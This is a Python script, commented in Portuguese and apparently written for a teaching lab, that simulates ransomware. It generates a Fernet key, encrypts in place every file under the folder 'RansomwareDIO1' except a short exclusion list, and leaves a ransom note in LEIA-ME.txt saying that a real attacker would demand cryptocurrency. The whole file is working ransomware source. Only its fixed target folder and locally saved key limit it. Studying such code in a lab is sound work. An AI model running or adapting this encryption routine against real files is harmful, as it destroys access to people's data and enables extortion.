from cryptography.fernet import Fernet
import os

# 1. Gerar chave de criptografia
key = Fernet.generate_key()
fernet = Fernet(key)

# Salvar a chave para uso posterior
with open("chave.key", "wb") as chave_file:
    chave_file.write(key)

# 2. Definir a pasta alvo
pasta_alvo = "RansomwareDIO1"

# 3. Lista de arquivos que NÃO devem ser criptografados
arquivos_excluidos = ["chave.key", "RW_DIO.py", "DescptRW_DIO.py", "LEIA-ME.txt"]

# 4. Percorrer todos os arquivos da pasta
for root, dirs, files in os.walk(pasta_alvo):
    for nome_arquivo in files:
        if nome_arquivo in arquivos_excluidos:
            continue

        caminho_arquivo = os.path.join(root, nome_arquivo)

        with open(caminho_arquivo, "rb") as file:
            dados = file.read()

        dados_criptografados = fernet.encrypt(dados)

        with open(caminho_arquivo, "wb") as file:
            file.write(dados_criptografados)

# 5. Criar mensagem de resgate em LEIA-ME.txt
mensagem = """
⚠️ SEUS ARQUIVOS FORAM CRIPTOGRAFADOS ⚠️

Todos os arquivos da pasta foram convertidos em dados ilegíveis.
Para recuperar seus arquivos:

1. Localize o arquivo 'chave.key' (simulação).
2. Utilize o script de descriptografia fornecido.
3. No mundo real, o atacante exigiria pagamento em criptomoedas.

⚠️ Este é apenas um LABORATÓRIO DIDÁTICO ⚠️
"""

with open(os.path.join(pasta_alvo, "LEIA-ME.txt"), "w", encoding="utf-8") as aviso:
    aviso.write(mensagem)

print("⚠️ Arquivos criptografados! Leia o arquivo 'LEIA-ME.txt' para instruções.")